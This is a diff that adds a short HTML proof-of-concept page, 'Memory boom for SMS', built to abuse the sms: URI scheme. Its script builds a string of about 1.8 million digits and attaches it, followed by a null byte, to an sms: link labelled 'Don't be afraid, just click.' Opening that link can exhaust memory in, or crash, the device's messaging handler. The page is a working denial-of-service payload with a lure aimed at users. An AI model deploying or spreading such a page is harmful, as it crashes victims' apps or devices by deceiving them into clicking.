@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Memory boom or how to abuse sms: URI scheme</title>
+<script src="//code.jquery.com/jquery-1.12.0.min.js"></script>
+<script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+</head>
+
+<body>
+<p>Memory boom for SMS (or how to abuse sms: URI scheme)</p>
+
+<p id="status">Get ready...</p>
+<p id="result" style="color:red"></p>
+</body>
+
+<script type="text/javascript">
+var extraData = "";
+for (itxextraData = 0; itxextraData < 200000; itxextraData++) {
+	 var extraData = extraData + "555555555";
+}
+jQuery('#result').append('<a href="sms:+' + extraData + '%00">Don\'t be afraid, just click.</a>');
+</script>
+</html>
